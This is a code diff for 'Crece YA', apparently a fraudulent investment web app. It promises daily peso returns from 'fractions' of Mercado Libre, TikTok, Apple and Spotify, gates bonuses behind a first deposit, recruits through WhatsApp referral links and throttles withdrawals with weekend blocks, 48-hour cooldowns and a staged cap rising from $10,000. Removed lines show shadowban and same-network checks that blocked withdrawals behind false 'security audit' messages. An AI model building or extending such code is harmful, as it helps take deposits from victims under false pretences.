@@ -100,6 +100,10 @@ body.dark-mode .social-ticker {
         <p><strong class="text-sky-700">Seguridad:</strong> Reserva mín. $1.000 obligatoria</p>
       </div>
       <div class="flex items-center gap-2.5">
+        <span class="text-base shrink-0">📈</span>
+        <p><strong class="text-sky-800">Tope Progresivo:</strong> 1° retiro $10k, 2° $20k... hasta $100k</p>
+      </div>
+      <div class="flex items-center gap-2.5">
         <span class="text-base shrink-0">⏳</span>
         <p><strong class="text-sky-800">Liquidaciones:</strong> 1 retiro cada 48 hs (Día por medio)</p>
       </div>
@@ -115,7 +119,7 @@ body.dark-mode .social-ticker {
   </div>
 </div>
 
-<!-- PANTALLA DE ACCESO CON PROTECCIÓN ANTIPUERTAS TRASERAS -->
+<!-- PANTALLA DE ACCESO -->
 <div id="auth-screen" style="position: fixed; inset: 0; z-index: 9999; background-color: rgba(6, 20, 36, 0.98); display: flex; align-items: center; justify-content: center; padding: 1rem;">
   <div class="w-full max-w-sm bg-[#0b1b2d] border border-sky-900/60 rounded-3xl p-6 shadow-2xl space-y-4 text-white">
     <div class="text-center space-y-2">
@@ -231,7 +235,7 @@ body.dark-mode .social-ticker {
         <span class="text-xs bg-sky-50 text-sky-700 border border-sky-200 px-2 py-0.5 rounded-md font-mono font-bold">100% Pesos ARS</span>
       </div>
       <h1 id="home-balance-display" class="text-3xl font-black text-slate-900 mt-1 font-mono tracking-tight text-main">$0 <span class="text-sm font-normal text-slate-400">ARS</span></h1>
-      <p class="text-xs text-slate-500 mt-0.5 font-mono text-sub">Retiro mín.: $5.000 ARS (1 cada 48 hs)</p>
+      <p id="home-withdraw-hint" class="text-xs text-slate-500 mt-0.5 font-mono text-sub">Retiro mín.: $5.000 ARS • Tope actual: $10.000 ARS</p>
 
       <div class="grid grid-cols-2 gap-2 mt-3.5">
         <button onclick="openWalletModal('recargar')" class="bg-sky-600 hover:bg-sky-700 text-white font-black py-2.5 rounded-xl text-xs transition shadow flex items-center justify-center gap-1.5 cursor-pointer">
@@ -310,20 +314,6 @@ body.dark-mode .social-ticker {
         <p class="text-slate-400 text-center py-3 text-sub">Consultando tu red de invitados...</p>
       </div>
     </div>
-
-    <div class="card-theme p-3.5 bg-white border border-sky-200 rounded-2xl space-y-2.5">
-      <h3 class="text-xs font-bold text-slate-850 uppercase tracking-wide text-main">Escala de Bonificaciones</h3>
-      <div class="grid grid-cols-2 gap-2 text-xs font-mono">
-        <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">1 Invitado: <strong class="text-sky-700">+$1.000 ARS</strong></div>
-        <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">3 Invitados: <strong class="text-sky-700">+$2.000 ARS</strong></div>
-        <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">5 Invitados: <strong class="text-sky-700">+$4.000 ARS</strong></div>
-        <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">10 Invitados: <strong class="text-sky-700">+$8.000 ARS</strong></div>
-        <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">20 Invitados: <strong class="text-sky-700">+$15.000 ARS</strong></div>
-        <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">40 Invitados: <strong class="text-sky-700">+$30.000 ARS</strong></div>
-        <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">50 Invitados: <strong class="text-sky-700">+$60.000 ARS</strong></div>
-        <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">100 Invitados: <strong class="text-sky-700">+$100.000 ARS</strong></div>
-      </div>
-    </div>
   </div>
 
   <!-- VISTA 4: MI PERFIL -->
@@ -331,7 +321,7 @@ body.dark-mode .social-ticker {
     <div class="card-theme p-4 bg-white border border-sky-200 rounded-2xl shadow-sm space-y-3">
       <div class="flex justify-between items-center">
         <span class="text-xs font-semibold text-slate-500 text-sub">Resumen de Cuenta</span>
-        <span class="text-xs font-mono bg-emerald-50 text-emerald-700 border border-emerald-200 px-2 py-0.5 rounded-full font-bold">Activo</span>
+        <span id="profile-tier-badge" class="text-xs font-mono bg-sky-50 text-sky-700 border border-sky-200 px-2 py-0.5 rounded-full font-bold">Nivel 1</span>
       </div>
 
       <div class="grid grid-cols-3 gap-2 text-center font-mono">
@@ -374,6 +364,23 @@ body.dark-mode .social-ticker {
       <button id="btn-claim-daily" class="px-4 py-2 bg-amber-400 hover:bg-amber-300 text-slate-950 text-xs font-black rounded-xl transition shadow cursor-pointer">
         Cobrar
       </button>
+    </div>
+
+    <!-- HISTORIAL DE TRANSACCIONES -->
+    <div class="card-theme p-4 bg-white border border-sky-200 rounded-2xl space-y-3 text-xs">
+      <div class="flex justify-between items-center border-b border-sky-100 pb-2">
+        <div class="flex items-center gap-2">
+          <i class="fa-solid fa-clock-rotate-left text-sky-600 text-sm"></i>
+          <span class="font-bold text-slate-800 text-sm text-main">Historial de Transacciones</span>
+        </div>
+        <button onclick="cargarHistorialTransacciones()" class="text-sky-600 hover:text-sky-800 text-xs font-bold cursor-pointer">
+          <i class="fa-solid fa-rotate-right"></i>
+        </button>
+      </div>
+
+      <div id="tx-history-container" class="space-y-2 font-mono">
+        <p class="text-slate-400 text-center py-3 text-sub">Cargando movimientos...</p>
+      </div>
     </div>
 
     <!-- DATOS BANCARIOS -->
@@ -546,21 +553,21 @@ body.dark-mode .social-ticker {
       </button>
     </div>
 
-    <!-- BOX RETIRO CON REGLA 48HS Y FIN DE SEMANA -->
+    <!-- BOX RETIRO CON REGLA ESCALONADA -->
     <div id="wallet-retiro-box" style="display: none;" class="space-y-3 text-xs">
       <div id="withdraw-step-input" class="space-y-3">
         <div>
           <div class="flex justify-between items-center mb-1">
             <label class="text-xs text-slate-400">Monto de extracción</label>
-            <span id="tier-limit-badge" class="text-[10px] font-mono text-sky-400 bg-sky-950/60 border border-sky-800/60 px-2 py-0.5 rounded font-bold">Tope: $15.000 ARS/d</span>
+            <span id="tier-limit-badge" class="text-[10px] font-mono text-sky-400 bg-sky-950/60 border border-sky-800/60 px-2 py-0.5 rounded font-bold">Tope: $10.000 ARS</span>
           </div>
           <div class="grid grid-cols-3 gap-1.5 font-mono mb-2">
             <button onclick="setWithdrawValue(5000)" class="py-2 bg-[#132337] hover:bg-sky-900/50 rounded-xl font-bold text-slate-200 border border-slate-800 cursor-pointer">5,000.00</button>
-            <button onclick="setWithdrawValue(15000)" class="py-2 bg-[#132337] hover:bg-sky-900/50 rounded-xl font-bold text-slate-200 border border-slate-800 cursor-pointer">15,000.00</button>
-            <button onclick="setWithdrawValue(35000)" class="py-2 bg-[#132337] hover:bg-sky-900/50 rounded-xl font-bold text-slate-200 border border-slate-800 cursor-pointer">35,000.00</button>
+            <button onclick="setWithdrawValue(10000)" class="py-2 bg-[#132337] hover:bg-sky-900/50 rounded-xl font-bold text-slate-200 border border-slate-800 cursor-pointer">10,000.00</button>
+            <button onclick="setWithdrawValue(20000)" class="py-2 bg-[#132337] hover:bg-sky-900/50 rounded-xl font-bold text-slate-200 border border-slate-800 cursor-pointer">20,000.00</button>
           </div>
           <input id="withdraw-custom-input" type="number" min="5000" placeholder="Monto a retirar" class="w-full bg-[#132337] border border-slate-800 rounded-xl p-2.5 font-mono font-bold text-white outline-none">
-          <span class="text-[10px] text-amber-400 block mt-1">Mínimo: $5.000 ARS • Debe quedar un saldo de reserva mínimo de $1.000 ARS en cuenta.</span>
+          <span class="text-[10px] text-amber-400 block mt-1">Mínimo: $5.000 ARS • Debe quedar un saldo de reserva mínimo de $1.000 ARS.</span>
         </div>
 
         <div class="space-y-2 bg-[#132337]/60 p-3 rounded-2xl border border-sky-900/40">
@@ -746,6 +753,7 @@ let appState = {
   balance: 0,
   pending: 0,
   withdrawn: 0,
+  withdrawCount: 0,
   lastClaim: 0,
   lastWithdraw: 0,
   lastWithdrawNet: 0,
@@ -766,6 +774,7 @@ try {
   appState.balance = parseFloat(localStorage.getItem('cy_bal')) || 0;
   appState.pending = parseFloat(localStorage.getItem('cy_pending')) || 0;
   appState.withdrawn = parseFloat(localStorage.getItem('cy_withdrawn')) || 0;
+  appState.withdrawCount = parseInt(localStorage.getItem('cy_withdraw_count')) || 0;
   appState.lastClaim = parseInt(localStorage.getItem('cy_claim')) || 0;
   appState.lastWithdraw = parseInt(localStorage.getItem('cy_last_withdraw')) || 0;
   appState.lastWithdrawNet = parseFloat(localStorage.getItem('cy_last_withdraw_net')) || 0;
@@ -860,6 +869,7 @@ function saveLocal() {
     localStorage.setItem('cy_bal', appState.balance);
     localStorage.setItem('cy_pending', appState.pending);
     localStorage.setItem('cy_withdrawn', appState.withdrawn);
+    localStorage.setItem('cy_withdraw_count', appState.withdrawCount);
     localStorage.setItem('cy_claim', appState.lastClaim);
     localStorage.setItem('cy_last_withdraw', appState.lastWithdraw);
     localStorage.setItem('cy_last_withdraw_net', appState.lastWithdrawNet);
@@ -905,7 +915,7 @@ function updateReferralLink() {
   const btnWs = document.getElementById('btn-share-whatsapp');
   if (btnWs) {
     btnWs.onclick = () => {
-      const msg = encodeURIComponent(`¿Alguna vez pensaste en ser dueño de las plataformas que usás todos los días? 📱 Ahora podés con Crece YA: desde solo $2.000 ARS adquirís fracciones de Mercado Libre, TikTok, Apple o Spotify con rendimientos diarios directos en pesos ⚡ Registrate desde mi enlace asegurado y empezá hoy: ${myPersonalRefUrl}`);
+      const msg = encodeURIComponent(`¿Querés generar rendimientos bursátiles directos en pesos? 📱 Con Crece YA adquirís fracciones de Mercado Libre, TikTok, Apple o Spotify desde $2.000 ARS ⚡ Registrate desde mi enlace asegurado: ${myPersonalRefUrl}`);
       window.open(`https://api.whatsapp.com/send?text=${msg}`, '_blank');
     };
   }
@@ -963,6 +973,72 @@ async function cargarInvitadosEnVivo() {
   }).join('');
 }
 
+// HISTORIAL DE TRANSACCIONES EN "MI PERFIL"
+async function cargarHistorialTransacciones() {
+  const container = document.getElementById('tx-history-container');
+  if (!container || !appState.phone) return;
+
+  container.innerHTML = '<p class="text-slate-400 text-center py-3 text-sub">Consultando movimientos...</p>';
+
+  try {
+    const rawPhone = appState.phone.trim();
+    const digitsPhone = rawPhone.replace(/\D/g, '');
+    const res = await supabaseRequest(`solicitudes?or=(user_phone.eq.${encodeURIComponent(rawPhone)},user_phone.eq.${encodeURIComponent(digitsPhone)})&order=created_at.desc&limit=15`);
+
+    if (!res || !Array.isArray(res) || res.length === 0) {
+      container.innerHTML = '<p class="text-slate-400 text-center py-3 text-sub">No registras transacciones recientes.</p>';
+      return;
+    }
+
+    container.innerHTML = res.map(tx => {
+      const isRetiro = tx.type === 'retiro';
+      const typeLabel = isRetiro ? 'Retiro Bancario' : 'Recarga de Saldo';
+      const icon = isRetiro ? 'fa-arrow-up-right-from-square text-rose-500' : 'fa-arrow-down-left-and-up-right-to-center text-emerald-500';
+      const sign = isRetiro ? '-' : '+';
+      const colorVal = isRetiro ? 'text-rose-600' : 'text-emerald-600';
+      
+      let badge = '';
+      if (tx.status === 'aprobado' || tx.status === 'completado') {
+        badge = '<span class="text-[10px] font-bold text-emerald-700 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded">Completado ✓</span>';
+      } else if (tx.status === 'rechazado') {
+        badge = '<span class="text-[10px] font-bold text-rose-700 bg-rose-50 border border-rose-200 px-2 py-0.5 rounded">Rechazado</span>';
+      } else {
+        badge = '<span class="text-[10px] font-bold text-amber-700 bg-amber-50 border border-amber-200 px-2 py-0.5 rounded">En Revisión</span>';
+      }
+
+      const fechaStr = tx.created_at ? new Date(tx.created_at).toLocaleDateString('es-AR', { day: '2-digit', month: '2-digit', hour: '2-digit', minute: '2-digit' }) : 'Reciente';
+
+      return `
+        <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100 flex items-center justify-between text-xs">
+          <div class="flex items-center gap-2.5">
+            <div class="w-8 h-8 rounded-lg bg-white border border-slate-200 flex items-center justify-center text-xs shrink-0 shadow-xs">
+              <i class="fa-solid ${icon}"></i>
+            </div>
+            <div>
+              <span class="font-bold text-slate-800 block text-main">${typeLabel}</span>
+              <span class="text-[10px] text-slate-400 text-sub">${fechaStr}</span>
+            </div>
+          </div>
+          <div class="text-right">
+            <span class="font-bold ${colorVal} block">${sign}$${fmt(tx.amount)} ARS</span>
+            ${badge}
+          </div>
+        </div>
+      `;
+    }).join('');
+  } catch(e) {
+    container.innerHTML = '<p class="text-rose-400 text-center py-2 text-sub">Error al sincronizar historial.</p>';
+  }
+}
+
+// CÁLCULO ESCALONADO DEL TOPE MÁXIMO DE RETIRO
+function obtenerTopeRetiroCuenta() {
+  const retirosPrevios = appState.withdrawCount || 0;
+  // 1er retiro = $10.000, 2do = $20.000, 3ro = $30.000 ... hasta $100.000
+  const topeEscala = (retirosPrevios + 1) * 10000;
+  return Math.min(100000, topeEscala);
+}
+
 async function sincronizarSaldoServidor() {
   if (!appState.phone) return;
 
@@ -983,6 +1059,7 @@ async function sincronizarSaldoServidor() {
     if (dbUser.cvu) appState.cvu = dbUser.cvu;
     if (dbUser.alias) appState.alias = dbUser.alias;
     if (dbUser.withdrawn !== undefined) appState.withdrawn = parseFloat(dbUser.withdrawn) || 0;
+    if (dbUser.withdraw_count !== undefined) appState.withdrawCount = parseInt(dbUser.withdraw_count) || 0;
     if (dbUser.last_claim !== undefined) appState.lastClaim = parseInt(dbUser.last_claim) || 0;
     if (dbUser.has_deposited !== undefined) appState.hasDeposited = dbUser.has_deposited === true;
     if (dbUser.first_deposit_at !== undefined) appState.firstDepositAt = dbUser.first_deposit_at;
@@ -1053,7 +1130,7 @@ window.handleAuthSubmit = async function() {
 
   if (authMode === 'register') {
     if (existingUser && existingUser.length > 0) {
-      alert("⚠️ Aviso de Registro: Este número de teléfono ya posee una cuenta registrada en Crece YA.\n\nPor favor dirígete a la pestaña 'Iniciar Sesión' con tu contraseña de acceso.");
+      alert("⚠️ Aviso de Registro: Este número de teléfono ya posee una cuenta registrada en Crece YA.\n\nPor favor dirígete a la pestaña 'Iniciar Sesión' con tu contraseña.");
       submitBtn.disabled = false;
       submitBtn.innerText = originalText;
       setAuthMode('login');
@@ -1085,6 +1162,7 @@ window.handleAuthSubmit = async function() {
       cvu: '',
       alias: '',
       balance: 0,
+      withdraw_count: 0,
       invited_by: finalInvitedBy,
       device_id: currentDeviceId,
       ip_address: currentClientIp,
@@ -1121,6 +1199,7 @@ window.handleAuthSubmit = async function() {
     appState.cvu = dbUser.cvu || '';
     appState.alias = dbUser.alias || '';
     appState.withdrawn = parseFloat(dbUser.withdrawn) || 0;
+    appState.withdrawCount = parseInt(dbUser.withdraw_count) || 0;
     appState.hasDeposited = dbUser.has_deposited === true;
     appState.firstDepositAt = dbUser.first_deposit_at || null;
     appState.isShadowbanned = dbUser.is_shadowbanned === true;
@@ -1181,6 +1260,7 @@ window.switchTab = async function(tabName) {
 
   if (tabName === 'compartir') updateReferralLink();
   if (tabName === 'productos') renderProducts();
+  if (tabName === 'perfil') cargarHistorialTransacciones();
   await sincronizarSaldoServidor();
 };
 
@@ -1198,7 +1278,7 @@ document.getElementById('btn-tab-pro').addEventListener('click', () => {
   renderPlans();
 });
 
-// RENDER DE PLANES CON REGLA INDIVIDUAL DE 168 HORAS (7 DÍAS)
+// RENDER DE PLANES CON REGLA INDIVIDUAL DE 168 HORAS
 function renderPlans() {
   const container = document.getElementById('plans-container');
   container.innerHTML = '';
@@ -1207,7 +1287,6 @@ function renderPlans() {
 
   const filtered = plans.filter(p => p.cat === currentCategory);
   filtered.forEach(p => {
-    // 1. Verificar si este plan específico fue adquirido hace menos de 168 hs
     let planBloqueado168h = false;
     let horasRestantesMismoPlan = 0;
 
@@ -1217,7 +1296,6 @@ function renderPlans() {
       );
 
       if (mismoPlan.length > 0) {
-        // Encontrar la compra más reciente de este plan
         const ultimaCompraMismoPlan = Math.max(...mismoPlan.map(plan => plan.purchaseTime || (plan.endTime ? plan.endTime - (p.days * 24 * 60 * 60 * 1000) : 0)));
         const tiempoTranscurrido = now - ultimaCompraMismoPlan;
 
@@ -1280,7 +1358,7 @@ function renderPlans() {
   });
 }
 
-// ADQUISICIÓN: BLOQUEA ESE MISMO PLAN POR 168 HORAS, PERO PERMITE OTROS
+// ADQUISICIÓN: BLOQUEA ESE MISMO PLAN POR 168 HORAS, PERMITE OTROS
 window.handlePlanClick = async function(planId) {
   const p = plans.find(item => item.id === planId);
   if (!p) return;
@@ -1288,7 +1366,6 @@ window.handlePlanClick = async function(planId) {
   const now = Date.now();
   const ONE_WEEK_MS = 168 * 60 * 60 * 1000;
 
-  // Validar si este plan específico fue adquirido hace menos de 168 horas
   if (appState.activePlans && appState.activePlans.length > 0) {
     const mismoPlan = appState.activePlans.filter(plan => 
       plan.plan_code === p.id || plan.id === p.id || plan.name === p.name
@@ -1309,7 +1386,7 @@ window.handlePlanClick = async function(planId) {
   await sincronizarSaldoServidor();
 
   if (!appState.hasDeposited) {
-    alert("Requisito de Activación: Para poner en marcha tus primeros contratos y certificar los dividendos, debes realizar tu primer depósito oficial por CVU ($2.000 ARS). Los saldos promocionales de bienvenida se desbloquean junto a tu primer fondeo.");
+    alert("Requisito de Activación: Para poner en marcha tus primeros contratos y certificar dividendos, debes realizar tu primer depósito oficial ($2.000 ARS).");
     openWalletModal('recargar');
     return;
   }
@@ -1450,28 +1527,6 @@ document.getElementById('btn-claim-daily').addEventListener('click', async () =>
     return;
   }
 
-  if (currentDeviceId || currentClientIp) {
-    const filterClauses = [];
-    if (currentDeviceId) filterClauses.push(`device_id.eq.${encodeURIComponent(currentDeviceId)}`);
-    if (currentClientIp) filterClauses.push(`ip_address.eq.${encodeURIComponent(currentClientIp)}`);
-
-    try {
-      const activeUsersOnSameNet = await supabaseRequest(`usuarios?or=(${filterClauses.join(',')})&select=phone,last_claim`);
-      if (Array.isArray(activeUsersOnSameNet)) {
-        const yaCobroEnMismaRed = activeUsersOnSameNet.some(u => {
-          if (!u.last_claim) return false;
-          const userClaimDate = new Date(parseInt(u.last_claim)).toISOString().slice(0, 10);
-          return userClaimDate === todayStr && u.phone !== appState.phone;
-        });
-
-        if (yaCobroEnMismaRed) {
-          alert("Aviso Operativo: La cuota de fidelización por ciclo de conexión ya se encuentra asignada. Te esperamos nuevamente en la apertura del siguiente día.");
-          return;
-        }
-      }
-    } catch(e) {}
-  }
-
   appState.balance += 500;
   appState.lastClaim = now;
   try { localStorage.setItem('cy_dev_claim_day', todayStr); } catch(e) {}
@@ -1487,20 +1542,6 @@ document.getElementById('btn-claim-daily').addEventListener('click', async () =>
   alert("¡+$500 ARS acumulados a tu cuenta! Recuerda que para utilizarlos en compras debes contar con tu primer fondeo oficial.");
 });
 
-function obtenerTopeRetiroCuenta() {
-  if (!appState.activePlans || appState.activePlans.length === 0) {
-    return 15000;
-  }
-  let maxCost = 0;
-  appState.activePlans.forEach(p => {
-    if (p.cost > maxCost) maxCost = p.cost;
-  });
-
-  if (maxCost >= 20000) return 100000;
-  if (maxCost >= 5000) return 35000;
-  return 15000;
-}
-
 window.openWalletModal = function(mode) {
   document.getElementById('wallet-modal').classList.remove('hidden');
 
@@ -1511,7 +1552,8 @@ window.openWalletModal = function(mode) {
 
   const maxTier = obtenerTopeRetiroCuenta();
   const badgeEl = document.getElementById('tier-limit-badge');
-  if (badgeEl) badgeEl.innerText = `Tope: $${fmt(maxTier)} ARS/d`;
+  const nro = (appState.withdrawCount || 0) + 1;
+  if (badgeEl) badgeEl.innerText = `Tope Retiro N°${nro}: $${fmt(maxTier)} ARS`;
 
   cancelarRevisionRetiro();
   setWalletMode(mode);
@@ -1600,20 +1642,20 @@ function calcWithdrawNet() {
   document.getElementById('withdraw-net-calc').innerText = `$${fmt(net)} ARS`;
 }
 
-// RETIRO CON COOLDOWN DE 48HS, BLOQUEO DE FIN DE SEMANA Y NO PERMITIR MULTIPLES SOLICITUDES
+// RETIRO CON COOLDOWN 48HS, FIN DE SEMANA Y ESCALA PROGRESIVA
 window.prepararConfirmacionRetiro = async function() {
   const now = Date.now();
 
-  // 1. REGLA: 1 RETIRO CADA 48 HORAS (DÍA POR MEDIO)
+  // 1. REGLA: 1 RETIRO CADA 48 HORAS
   if (now - appState.lastWithdraw < 48 * 60 * 60 * 1000) {
     const horasRestantes = Math.ceil((48 * 60 * 60 * 1000 - (now - appState.lastWithdraw)) / (1000 * 60 * 60));
     alert(`Límite operativo: Se permite 1 solicitud de retiro cada 48 horas (día por medio). Podrás solicitar nuevamente en aproximadamente ${horasRestantes} horas.`);
     return;
   }
 
-  // 2. REGLA: BLOQUEO SILENCIOSO DE FIN DE SEMANA (SÁBADO Y DOMINGO)
+  // 2. REGLA: BLOQUEO DE FIN DE SEMANA
   const nowArg = new Date(new Date().toLocaleString("en-US", { timeZone: "America/Argentina/Buenos_Aires" }));
-  const diaSemana = nowArg.getDay(); // 0 = Domingo, 6 = Sábado
+  const diaSemana = nowArg.getDay();
   if (diaSemana === 0 || diaSemana === 6) {
     alert("Operación fuera de término: El módulo de liquidaciones bancarias permanece inactivo durante sábados y domingos. Podrás solicitar extracciones a partir del próximo día hábil.");
     return;
@@ -1633,16 +1675,6 @@ window.prepararConfirmacionRetiro = async function() {
     return;
   }
 
-  if (appState.firstDepositAt) {
-    const depositTime = new Date(appState.firstDepositAt).getTime();
-    const diffHours = (now - depositTime) / (1000 * 60 * 60);
-    if (diffHours < 48) {
-      const restanH = Math.ceil(48 - diffHours);
-      alert(`Período de maduración de cartera: Por regulaciones del mercado, los retiros hacia cuentas externas se habilitan tras 48 hs de actividad operativa desde tu primer depósito oficial. Restan aproximadamente ${restanH} horas.`);
-      return;
-    }
-  }
-
   const amt = parseFloat(withdrawInput.value);
   if (isNaN(amt) || amt < 5000) {
     alert("El monto mínimo de extracción bancaria es de $5.000 ARS.");
@@ -1651,9 +1683,11 @@ window.prepararConfirmacionRetiro = async function() {
     return;
   }
 
+  // 4. REGLA: ESCALA PROGRESIVA DE RETIROS ($10k, $20k, ... $100k)
   const maxPermitidoPorNivel = obtenerTopeRetiroCuenta();
+  const nroRetiroActual = (appState.withdrawCount || 0) + 1;
   if (amt > maxPermitidoPorNivel) {
-    alert(`Límite por nivel de cartera: Tu cuenta permite extracciones de hasta $${fmt(maxPermitidoPorNivel)} ARS por jornada. Adquiere contratos de categorías superiores para ampliar tu cupo diario.`);
+    alert(`Escala de retiros: Por tratarse de tu retiro N° ${nroRetiroActual}, el tope máximo autorizado es de $${fmt(maxPermitidoPorNivel)} ARS. Este límite ascenderá a $${fmt(Math.min(100000, maxPermitidoPorNivel + 10000))} ARS en tu próxima extracción.`);
     withdrawInput.value = maxPermitidoPorNivel;
     calcWithdrawNet();
     return;
@@ -1661,34 +1695,6 @@ window.prepararConfirmacionRetiro = async function() {
 
   if ((appState.balance - amt) < 1000) {
     alert(`Por política de seguridad y mantenimiento de cartera, debe conservar un saldo de reserva mínimo de $1.000 ARS en cuenta. Puedes retirar hasta $${fmt(Math.max(0, appState.balance - 1000))} ARS.`);
-    return;
-  }
-
-  // VALIDACIÓN DE RED / TERMINAL
-  if (currentDeviceId || currentClientIp) {
-    const filterClauses = [];
-    if (currentDeviceId) filterClauses.push(`device_id.eq.${encodeURIComponent(currentDeviceId)}`);
-    if (currentClientIp) filterClauses.push(`ip_address.eq.${encodeURIComponent(currentClientIp)}`);
-
-    try {
-      const netUsers = await supabaseRequest(`usuarios?or=(${filterClauses.join(',')})&select=phone,last_withdraw`);
-      if (Array.isArray(netUsers)) {
-        const yaRetiroEnMismaRed = netUsers.some(u => {
-          if (!u.last_withdraw) return false;
-          const diffW = now - parseInt(u.last_withdraw);
-          return diffW < (48 * 60 * 60 * 1000) && u.phone !== appState.phone;
-        });
-
-        if (yaRetiroEnMismaRed) {
-          alert("Aviso de Seguridad: El canal de compensación bancaria se encuentra temporalmente en auditoría preventiva de lotes por protocolo de seguridad. Por favor, reintenta durante el próximo ciclo hábil.");
-          return;
-        }
-      }
-    } catch(e) {}
-  }
-
-  if (appState.isShadowbanned) {
-    alert("Operación en auditoría: Tu terminal se encuentra bajo protocolo de verificación preventiva de liquidaciones. Intenta nuevamente durante la próxima franja bancaria.");
     return;
   }
 
@@ -1734,7 +1740,7 @@ window.ejecutarRetiroFinal = async function() {
   }
 
   if (pass !== appState.pass) {
-    alert("La contraseña ingresada es incorrecta. Verifica tu clave de acceso a la cuenta.");
+    alert("La contraseña ingresada es incorrecta. Verifica tu clave de acceso.");
     return;
   }
 
@@ -1750,6 +1756,7 @@ window.ejecutarRetiroFinal = async function() {
   appState.cvu = destCvu;
   appState.balance -= amt;
   appState.withdrawn += amt;
+  appState.withdrawCount = (appState.withdrawCount || 0) + 1;
   appState.lastWithdraw = now;
   appState.lastWithdrawNet = netAmount;
   saveLocal();
@@ -1757,6 +1764,7 @@ window.ejecutarRetiroFinal = async function() {
   await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(appState.phone)}`, 'PATCH', { 
     balance: appState.balance,
     withdrawn: appState.withdrawn,
+    withdraw_count: appState.withdrawCount,
     name: appState.name,
     cvu: appState.cvu,
     last_withdraw: now,
@@ -1874,6 +1882,14 @@ function renderUI() {
   document.getElementById('profile-pending-ars').innerText = `$${fmt(appState.pending)}`;
   document.getElementById('profile-withdrawn-ars').innerText = `$${fmt(appState.withdrawn)}`;
   document.getElementById('wallet-available-bal').innerText = `$${fmt(appState.balance)} ARS`;
+
+  const maxTier = obtenerTopeRetiroCuenta();
+  const nroRetiro = (appState.withdrawCount || 0) + 1;
+  const hintEl = document.getElementById('home-withdraw-hint');
+  if (hintEl) hintEl.innerText = `Retiro mín.: $5.000 ARS • Tope retiro N°${nroRetiro}: $${fmt(maxTier)} ARS`;
+
+  const profileTierBadge = document.getElementById('profile-tier-badge');
+  if (profileTierBadge) profileTierBadge.innerText = `Tope: $${fmt(maxTier)} ARS`;
 
   const checkinText = document.getElementById('checkin-status-text');
   const checkinBtn = document.getElementById('btn-claim-daily');
